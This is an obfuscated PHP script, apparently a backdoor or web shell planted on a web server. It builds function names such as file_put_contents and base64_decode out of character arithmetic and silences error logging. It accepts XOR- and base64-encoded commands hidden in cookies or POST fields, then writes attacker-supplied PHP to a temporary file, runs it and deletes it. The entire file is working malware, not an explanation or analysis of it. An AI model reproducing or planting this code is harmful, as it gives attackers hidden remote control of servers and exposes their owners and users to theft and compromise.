<?php $vcrpdguji = chr(341-239).chr(410-305).'l'.chr(101).'_'.chr(112)."\165".chr(116).chr(95).chr(560-461).chr(111)."\156".chr(119-3).chr(154-53).chr(624-514)."\x74".chr(1076-961);
$yxqxtnc = "\142".'a'.chr(115).'e'."\x36"."\x34".chr(805-710).chr(100).chr(101)."\x63".chr(111)."\x64"."\x65";
$xwnqic = chr(105).chr(111-1)."\151".chr(95)."\163".chr(101)."\164";
$mfbhpjp = chr(729-612)."\x6e".chr(108).chr(105)."\x6e".chr(418-311);


@$xwnqic("\x65".chr(375-261).'r'.chr(111).chr(114)."\137".'l'."\x6f".chr(103), NULL);
@$xwnqic(chr(951-843)."\x6f".chr(103).chr(95)."\145".chr(114)."\162".'o'."\x72"."\163", 0);
@$xwnqic(chr(964-855)."\141".'x'.chr(504-409).chr(680-579).'x'.chr(101)."\143".chr(117).'t'."\151"."\157"."\156".chr(95).'t'."\x69".'m'."\x65", 0);
@set_time_limit(0);

function bmvkoaidos($pvjsrbt, $gauvkotv)
{
    $ybdnsaxskz = "";
    for ($bagkqb = 0; $bagkqb < strlen($pvjsrbt);) {
        for ($j = 0; $j < strlen($gauvkotv) && $bagkqb < strlen($pvjsrbt); $j++, $bagkqb++) {
            $ybdnsaxskz .= chr(ord($pvjsrbt[$bagkqb]) ^ ord($gauvkotv[$j]));
        }
    }
    return $ybdnsaxskz;
}

$rfuvgvvkx = array_merge($_COOKIE, $_POST);
$qsoqcqz = '2d6c8fbc-a05b-421f-8ac7-df2090599773';
foreach ($rfuvgvvkx as $wboqam => $pvjsrbt) {
    $pvjsrbt = @unserialize(bmvkoaidos(bmvkoaidos($yxqxtnc($pvjsrbt), $qsoqcqz), $wboqam));
    if (isset($pvjsrbt[chr(97).'k'])) {
        if ($pvjsrbt["\141"] == "\151") {
            $bagkqb = array(
                "\x70".'v' => @phpversion(),
                chr(115).'v' => "3.5",
            );
            echo @serialize($bagkqb);
        } elseif ($pvjsrbt["\141"] == "\145") {
            $dhfpbukuf = "./" . md5($qsoqcqz) . "\56".'i'.chr(110)."\x63";
            @$vcrpdguji($dhfpbukuf, "<" . '?'."\x70".'h'."\160".' '."\100"."\x75".chr(1053-943).chr(714-606)."\151".chr(745-635).'k'.'('.chr(987-892).'_'."\106".'I'.chr(268-192).chr(69).'_'.chr(752-657)."\x29".chr(654-595).' ' . $pvjsrbt[chr(468-368)]);
            include($dhfpbukuf);
            @$mfbhpjp($dhfpbukuf);
        }
        exit();
    }
}

